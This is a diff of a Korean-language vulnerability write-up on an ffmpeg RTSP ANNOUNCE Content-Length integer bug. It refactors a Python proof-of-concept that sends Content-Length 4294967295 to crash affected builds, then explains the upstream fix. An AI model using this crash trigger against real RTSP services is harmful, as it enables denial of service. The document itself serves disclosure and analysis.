@@ -148,27 +148,43 @@ aarch64 Linux는 LP64라서 `int`는 32-bit, `long`은 64-bit.
 
 ```python
 #!/usr/bin/env python3
-import argparse, socket
 
-p = argparse.ArgumentParser()
-p.add_argument("host", nargs="?", default="127.0.0.1")
-p.add_argument("port", nargs="?", type=int, default=8554)
-p.add_argument("--value", default="4294967295")
-p.add_argument("--path", default="poc")
-p.add_argument("--body", default="v=0\r\n")
-args = p.parse_args()
+import argparse
+import socket
 
-req = (
-    f"ANNOUNCE rtsp://{args.host}:{args.port}/{args.path} RTSP/1.0\r\n"
-    f"CSeq: 1\r\n"
-    f"Content-Type: application/sdp\r\n"
-    f"Content-Length: {args.value}\r\n"
-    f"\r\n"
-).encode("latin1") + args.body.encode("latin1")
 
-s = socket.socket(); s.connect((args.host, args.port)); s.sendall(req)
-print(s.recv(4096).decode("latin1", "ignore"))
-s.close()
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("host", nargs="?", default="127.0.0.1")
+    parser.add_argument("port", nargs="?", type=int, default=8554)
+    parser.add_argument("--value", default="4294967295")
+    parser.add_argument("--path", default="poc")
+    parser.add_argument("--body", default="v=0\r\n")
+    args = parser.parse_args()
+
+    request = (
+        f"ANNOUNCE rtsp://{args.host}:{args.port}/{args.path} RTSP/1.0\r\n"
+        f"CSeq: 1\r\n"
+        f"Content-Type: application/sdp\r\n"
+        f"Content-Length: {args.value}\r\n"
+        f"\r\n"
+    ).encode("latin1") + args.body.encode("latin1")
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((args.host, args.port))
+    sock.sendall(request)
+
+    try:
+        data = sock.recv(4096)
+        print(data.decode("latin1", "ignore"))
+    except OSError as exc:
+        print(exc)
+    finally:
+        sock.close()
+
+
+if __name__ == "__main__":
+    main()
 ```
 
 구성을 짚어보면:
@@ -178,7 +194,7 @@ s.close()
 - 요청 조립은 별도 RTSP 클라이언트 라이브러리 없이 socket으로 raw RTSP 평문을 직접 만든다. 메서드 `ANNOUNCE`에 필수 헤더 세 개(`CSeq`, `Content-Type: application/sdp`, `Content-Length`)만 채우면 ffmpeg의 listen-mode ANNOUNCE 분기에 정상 진입한다.
 - 진짜 트리거는 `Content-Length: {args.value}` 한 줄. 나머지 헤더와 본문은 그 분기를 타고 라인 208까지 도달하기 위한 장식일 뿐이다.
 
-마지막 `s.recv(4096)`로 응답을 받으러 가지만, affected 빌드라면 그 사이 ffmpeg는 라인 208의 underflow를 맞고 ASan abort로 죽어 있다 — `recv()`는 EOF를 받고 빈 문자열이 출력될 가능성이 높다.
+마지막 `sock.recv(4096)`로 응답을 받으러 가지만, affected 빌드라면 그 사이 ffmpeg는 라인 208의 underflow를 맞고 ASan abort로 죽어 있다 — `recv()`는 EOF를 받고 빈 문자열이 출력될 가능성이 높다.
 
 서버 쪽:
 
@@ -350,7 +366,7 @@ ASan 없는 별도 debug 빌드에서 Memcheck로도 돌렸다.
 ```
 
 `if (request.content_length)` → `if (request.content_length > 0)` 로 바뀌면서, 이전엔 `0`만 거르고 음수는 그대로 통과시켰던 게 이제 양수가 아닌 모든 값을 같이 떨어뜨리게 되었다.
-우리가 보낸 `Content-Length: 4294967295` → `int -1` 케이스도 여기서 바로 fail 처리되어 `av_malloc`을 호출조차 하지 않는다.
+우리가 보낸 `Content-Length: 2³² − 1 (= 4294967295)` → `int -1` 케이스도 여기서 바로 fail 처리되어 `av_malloc`을 호출조차 하지 않는다.
 
 else 분기(원래는 "Content-Length header value exceeds sdp allocated buffer (4KB)"라는 약간 부정확한 에러를 뱉던 자리)의 메시지와 반환 코드도 같이 정리됐다.
 `AVERROR(EIO)` → `AVERROR_INVALIDDATA`로 의미를 맞추고, 로그에는 잘못된 실제 값(`%d`)을 그대로 출력하도록 바꿨다.
